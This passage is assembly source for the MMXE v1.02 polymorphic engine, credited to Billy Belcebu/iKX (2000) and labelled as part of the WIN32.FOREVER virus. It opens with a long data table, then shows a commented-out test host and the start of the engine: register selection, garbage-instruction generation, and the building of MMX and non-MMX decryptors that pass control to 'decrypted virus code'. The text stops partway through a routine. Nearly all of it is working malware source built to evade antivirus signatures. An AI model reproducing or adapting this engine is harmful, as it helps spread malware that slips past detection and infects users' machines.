           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      000h, 001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch
           db      000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 006h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 012h, 000h, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 006h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch
           db      000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h
           db      000h, 07Ch, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 01Ah, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 004h, 000h, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 004h
           db      000h, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 004h, 000h, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 004h, 000h, 0FFh, 07Fh, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 0FFh, 07Fh, 000h
           db      024h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 004h, 000h, 0FFh, 07Fh, 000h, 001h, 000h
           db      07Ch, 000h, 001h, 000h, 07Ch, 000h, 001h, 000h
           db      07Ch, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 00Eh, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 082h, 000h, 001h, 000h
           db      001h, 000h, 001h, 000h, 001h, 000h, 020h, 020h
           db      000h, 002h, 000h, 001h, 000h, 001h, 000h, 018h
           db      000h, 001h, 000h, 0A8h, 008h, 000h, 002h, 000h
           db      001h, 000h, 0A5h, 008h
   sdr0p1  equ     ($-offset dr0p1)

   ;------------------------------[ MMXE102.INC ]------------------------------;

   ;############################################################################
   ;# WIN32.FOREVER - POLY ENGINE (MMXE v1.02)      (c) 2000 Billy Belcebu/iKX #
   ;############################################################################

   ; This is a fake host used for testing the babe

   comment ~
           .586p
           .model  flat,stdcall

   extrn   ExitProcess:PROC
   extrn   GetTickCount:PROC
   extrn   MessageBoxA:PROC
   rdtcs   equ <dw 310Fh>

           .data
           db      "[MMXE] - MultiMedia eXtensions Engine v1.02",0
           db      "Who said that 2nd versions were worse than 1st ones?",0
           .code

   ; Here follows some code used by me for test the engine

   fakehost:
           xor     ebp,ebp

           call    GetTickCount
           mov     dword ptr [ebp+rnd_seed1],eax
           rdtcs
           mov     dword ptr [ebp+rnd_seed2],eax
           mov     dword ptr [ebp+rnd_seed3],edx

           int     3

           lea     esi,crypt
           lea     edi,buffer
           mov     ecx,cryptsize
           call    mmxe

           call    buffer                          ; Decrypt

           push    00001000h
           push    offset c1
           push    offset c2
           push    00000000h
           call    MessageBoxA

           push    0
           call    ExitProcess

           nop

   buffer:
           db      LIMIT dup (90h)

   crypt:  ret
   c1:     db      "[MMXE."
           db      (mmxe_end-mmxe)/1000 mod 10 + "0"
           db      (mmxe_end-mmxe)/0100 mod 10 + "0"
           db      (mmxe_end-mmxe)/0010 mod 10 + "0"
           db      (mmxe_end-mmxe)/0001 mod 10 + "0"
           db      "]",0
   c2:     db      "Late at night i found myself again",10
           db      "wondering and watching TV",10
           db      "I can't believe what's on the screen",10
           db      "something that i wouldn't like to see",10
           db      "Many rare species will perish soon",10
           db      "and we'll be short on food",10
           db      "Why do we have to be so selfish",10
           db      "we have to change our attitude",10
           db      "I know that i am not",10
           db      "the only one that's worried",10
           db      "Why don't we all",10
           db      "wake up, and and realize",10
           db      "Like the birds in the sky",10
           db      "we are flying so high",10
           db      "without making anykind of sacrifice",10
           db      "We've got so little time",10
           db      "to undo this crime",10
           db      "or we'll lose our paradise",10
           db      "It seems to me that there's no sense at all",10
           db      "nobody cares, it's always the same",10
           db      "Mother nature's crying out in pain",10
           db      "I know we are the ones to blame",10
           db      "Paradise [ Stratovarius ]",10,10
           db      "(c) 2000 Billy Belcebu/iKX",0
           dd      00000000h
   cryptsize       equ $-crypt

           ~

   ; Here begins the party

   ; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
   ; [MMXE] - MultiMedia eXtensions Engine v1.02
   ; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
   ;
   ; input:
   ;       ECX = Size of code to encrypt
   ;       ESI = Pointer to the data to encrypt
   ;       EDI = Buffer where put the decryptor
   ;       EBP = Delta Offset
   ; output:
   ;       ECX = Decryptor size
   ;
   ;       All the other registers, preserved.
   ;

   ; [ Default MMXE settings ]

   LIMIT           equ     1000h                   ; Decryptor size (4K)
   RECURSION       equ     05h                     ; The recursion level of THME
   nGARBAGE        equ     08h                     ; Sorta level of garbage

   ; [ Registers ]

   _EAX            equ     00000000b               ; All these are the numeric
   _ECX            equ     00000001b               ; value of all the registers.
   _EDX            equ     00000010b               ; Heh, i haven't used here
   _EBX            equ     00000011b               ; all this, but... wtf? they
   _ESP            equ     00000100b               ; don't waste bytes, and ma-
   _EBP            equ     00000101b               ; ke this shit to be more
   _ESI            equ     00000110b               ; clear :)
   _EDI            equ     00000111b               ;

   ; [ MMX registers ]

   _MM0            equ     00000000b
   _MM1            equ     00000001b
   _MM2            equ     00000010b
   _MM3            equ     00000011b
   _MM4            equ     00000100b
   _MM5            equ     00000101b
   _MM6            equ     00000110b
   _MM7            equ     00000111b

   ; [ Internal flags ]

   _CHECK4MMX      equ     0000000000000001b
   _DELTAOFFSET    equ     0000000000000010b
   _LOADSIZE       equ     0000000000000100b
   _LOADPOINTER    equ     0000000000001000b
   _LOADKEY        equ     0000000000010000b
   _PASSKEY2MMX    equ     0000000000100000b
   _PASSPTR2MMX    equ     0000000001000000b
   _CRYPT          equ     0000000010000000b
   _PASSMMX2PTR    equ     0000000100000000b
   _INCPOINTER     equ     0000001000000000b
   _DECCOUNTER     equ     0000010000000000b
   _LOOP           equ     0000100000000000b

   ; [ POSITIONS ]

   @CHECK4MMX      equ     00h
   @DELTAOFFSET    equ     01h
   @LOADSIZE       equ     02h
   @LOADPOINTER    equ     03h
   @LOADKEY        equ     04h
   @PASSKEY2MMX    equ     05h
   @PASSPTR2MMX    equ     06h
   @CRYPT          equ     07h
   @PASSMMX2PTR    equ     08h
   @INCPOINTER     equ     09h
   @DECCOUNTER     equ     0Ah
   @LOOP           equ     0Bh

   ; [ PUSHAD structure ]

   PUSHAD_EDI      equ     00h
   PUSHAD_ESI      equ     04h
   PUSHAD_EBP      equ     08h
   PUSHAD_ESP      equ     0Ch
   PUSHAD_EBX      equ     10h
   PUSHAD_EDX      equ     14h
   PUSHAD_ECX      equ     18h
   PUSHAD_EAX      equ     1Ch

   RETURN_ADDRESS  equ     04h

   ; [ MMXE v1.02 ]

   mmxe            proc
       pushad
           call    @@init_mmxe                     ; Initialize some engine values

       pushad
           call    @@crypt_data                    ; Crypt the data now
       popad

       call    @@gen_some_garbage

           call    @@gen_check4mmx                 ; This must be first :)

       call    @@gen_some_garbage

   ; Generate the 5 parts of the decryptor that go before the loop

   @@gb4l_:
       call    @@gen_some_garbage
       call    @@gen_before_loop
   @@gb4l?:
       movzx   ecx,word ptr [ebp+@@flags]
       xor     ecx,_CHECK4MMX or \             ; Check if all flags were
               _DELTAOFFSET or \           ; done ... (They should be,
               _LOADSIZE or \              ; but i don't trust in my own
               _LOADPOINTER or \           ; code :)
               _LOADKEY or \
               _PASSKEY2MMX
       jnz     @@gb4l_

   ; Get the loop point

       call    @@getloopaddress
       call    @@gen_some_garbage

   ; Generate the decryptor instructions that form the loop

       lea     esi,[ebp+@@after_looptbl]
       mov     ecx,@@s_aftlooptbl
   @@gal:  lodsd
       add     eax,ebp

       push    ecx esi
       call    eax
       call    @@gen_some_garbage
       pop     esi ecx

       loop    @@gal
           nop
           nop

           mov     al,0E9h                         ; Build the jmp for jump over
           stosb                                   ; the MMX decryptor and the
           mov     eax,LIMIT                       ; shit after it :)
       mov     ebx,edi
       sub     ebx,dword ptr [ebp+@@ptr_buffer]
       add     ebx,4
       sub     eax,ebx
       stosd

   ; And now generate the non-MMX decryptor

       call    @@gen_garbage

       mov     eax,dword ptr [ebp+@@ptrto2nd]
       mov     ebx,edi
       sub     ebx,eax
       sub     ebx,4
       mov     dword ptr [eax],ebx

       and     word ptr [ebp+@@flags],0000h
       and     byte ptr [ebp+@@init_mmx?],00h
       or      word ptr [ebp+@@flags],_CHECK4MMX

   @@gb4lx_:
       call    @@gen_some_garbage
       call    @@gen_before_loop_non_mmx

   @@gb4lx?:
       movzx   ecx,word ptr [ebp+@@flags]
       xor     ecx,_CHECK4MMX or \             ; Check if all flags were
               _DELTAOFFSET or \           ; done ... (They should be,
               _LOADSIZE or \              ; but i don't trust in my own
               _LOADPOINTER or \           ; code :)
               _LOADKEY
       jz      @@continue_with_this

       movzx   ecx,word ptr [ebp+@@flags]
       xor     ecx,_CHECK4MMX or \             ; In strange files, i dunno
               _DELTAOFFSET or \           ; why, instead 1F, we must
               _LOADSIZE or \              ; check for 3F... otherwise,
               _LOADPOINTER or \           ; all it goes to hell :(
               _LOADKEY or \
               _PASSKEY2MMX
       jnz     @@gb4lx_

   @@continue_with_this:
       call    @@gen_garbage
       call    @@getloopaddress

       lea     esi,[ebp+@@after_l00ptbl]
       mov     ecx,@@s_aftl00ptbl
   @@galx: lodsd
       add     eax,ebp

       push    ecx esi
       call    eax
       call    @@gen_some_garbage
       pop     esi ecx

       loop    @@galx

       mov     al,0E9h                         ; Generate the JMP to the
       stosb                                   ; decrypted virus code
       mov     eax,LIMIT
       mov     ebx,edi
       sub     ebx,dword ptr [ebp+@@ptr_buffer]
       add     ebx,04h
       sub     eax,ebx
       stosd

       xchg    eax,ecx                         ; Fill with shit the rest
   @@FillTheRest:
           pushfd
       call    random
           popfd
       stosb
       loop    @@FillTheRest
   @@scissors:
       call    @@uninit_mmxe
       popad
       ret

   ; --- MMXE rlz!

           db      00h,"[MMXE v1.02]",00h          ; Engine mark

   ; --- Initialization & Uninitialization routines

   @@init_mmxe:
       mov     dword ptr [ebp+@@ptr_data2enc],esi
       mov     dword ptr [ebp+@@ptr_buffer],edi
       mov     dword ptr [ebp+@@size2enc],ecx
       shr     ecx,2
       mov     dword ptr [ebp+@@size2cryptd4],ecx
       and     byte ptr [ebp+@@init_mmx?],00h
       and     word ptr [ebp+@@flags],00h
       call    random
       mov     dword ptr [ebp+@@enc_key],eax

   @@get_key:
           call    r_range,08h                     ; Select the register that
           or      eax,eax                         ; will be used as KEY
       jz      @@get_key
       cmp     eax,_ESP
       jz      @@get_key
       mov     byte ptr [ebp+@@reg_key],al
       mov     ebx,eax
   @@get_ptr2data:
           call    r_range,08h                     ; Select the register that will
           or      eax,eax                         ; be used as pointer
       jz      @@get_ptr2data
       cmp     eax,_ESP
       jz      @@get_ptr2data
       cmp     eax,_EBP
       jz      @@get_ptr2data
       cmp     eax,ebx
       jz      @@get_ptr2data
       mov     byte ptr [ebp+@@reg_ptr2data],al
       mov     ecx,eax
   @@get_counter:
           call    r_range,08h                     ; Choose the reg that will
           or      eax,eax                         ; be used as counter :)
       jz      @@get_counter
       cmp     eax,_ESP
       jz      @@get_counter
       cmp     eax,ebx
       jz      @@get_counter
       cmp     eax,ecx
       jz      @@get_counter
       mov     byte ptr [ebp+@@reg_counter],al
       mov     edx,eax
   @@get_delta:
           call    r_range,08h                     ; Select the register that
           or      eax,eax                         ; will be used for realocation
           jz      @@get_delta                     ; of the pointer
       cmp     eax,_ESP
       jz      @@get_delta
       cmp     eax,ebx
       jz      @@get_delta
       cmp     eax,ecx
       jz      @@get_delta
       cmp     eax,edx
       jz      @@get_delta
       mov     byte ptr [ebp+@@reg_delta],al
       mov     edx,eax
   @@get_mmxptr2data:
           call    r_range,08h                     ; Now select one MMX register
           mov     byte ptr [ebp+@@mmx_ptr2data],al ; for be used as pointer
       mov     ebx,eax
   @@get_mmxkey:
           call    r_range,08h                     ; And now a MMX register for
           cmp     eax,ebx                         ; be used as key (for PXOR)
           jz      @@get_mmxkey
       mov     byte ptr [ebp+@@mmx_key],al

       mov     dword ptr [edi],"EXMM"
       ret

   ; --- Uninitialization routine

   @@uninit_mmxe:
           mov     ecx,edi                         ; Obtain the size of genera-
           sub     ecx,dword ptr [ebp+@@ptr_buffer] ; ted shit
       mov     [esp.RETURN_ADDRESS.PUSHAD_ECX],ecx
       ret

   ; --- Useful subroutines used by the engine

   @@get_register:
           movzx   ebx,byte ptr [ebp+@@reg_key]    ; This routine will return an
           movzx   ecx,byte ptr [ebp+@@reg_ptr2data] ; unused register for be
           movzx   edx,byte ptr [ebp+@@reg_counter] ; used for play with garbage
       movzx   esi,byte ptr [ebp+@@reg_delta]
   @@gr_get_another:
           call    r_range,08h
       cmp     eax,_ESP
       jz      @@gr_get_another
       cmp     eax,ebx
       jz      @@gr_get_another
       cmp     eax,ecx
       jz      @@gr_get_another
       cmp     eax,edx
       jz      @@gr_get_another
       cmp     eax,esi
       jz      @@gr_get_another
       cmp     al,byte ptr [ebp+@@reg_mask]
       jz      @@gr_get_another
       ret

   @@get_mmx_register:
           movzx   ebx,byte ptr [ebp+@@mmx_ptr2data] ; Does the same than above's
           movzx   ecx,byte ptr [ebp+@@mmx_key]    ; code but with MMX registers
   @@gmmxr_get_another:
           call    r_range,08h
       cmp     eax,ebx
       jz      @@gmmxr_get_another
       cmp     eax,ecx
       jz      @@gmmxr_get_another
       ret

   @@clear_mask:
           and     byte ptr [ebp+@@reg_mask],00h   ; Clear the register mask
       ret

   @@is_register:
           cmp     al,byte ptr [ebp+@@reg_key]     ; This is used for know if a
           jz      @@is_used                       ; register we want to use for
           cmp     al,byte ptr [ebp+@@reg_ptr2data]; any reason is selected for
           jz      @@is_used                       ; make any other important
           cmp     al,byte ptr [ebp+@@reg_counter] ; job.
       jz      @@is_used
       cmp     al,byte ptr [ebp+@@reg_delta]
       jz      @@is_used
       cmp     al,byte ptr [ebp+@@reg_mask]
       jz      @@is_used
       mov     cl,00h
       org     $-1
   @@is_used:
       stc
       ret

   @@gen_before_loop:
           call    r_range,05h
       or      eax,eax                         ; 0
       jz      @@try_deltaoffset
       dec     eax                             ; 1
       jz      @@try_loadsize
       dec     eax                             ; 2
       jz      @@try_loadpointer
       dec     eax                             ; 3
       jz      @@try_loadkey                   ; 4
       jmp     @@try_passkey2mmx               ; 5

   @@try_deltaoffset:
       bt      word ptr [ebp+@@flags],@DELTAOFFSET
       jc      @@gen_before_loop
       call    @@gen_deltaoffset
       ret

   @@try_loadsize:
       bt      word ptr [ebp+@@flags],@LOADSIZE
       jc      @@gen_before_loop
       call    @@gen_loadsize
       ret

   @@try_loadpointer:
       bt      word ptr [ebp+@@flags],@LOADPOINTER
       jc      @@gen_before_loop
       bt      word ptr [ebp+@@flags],@DELTAOFFSET
       jnc     @@gen_before_loop
       call    @@gen_loadpointer
       ret

   @@try_loadkey:
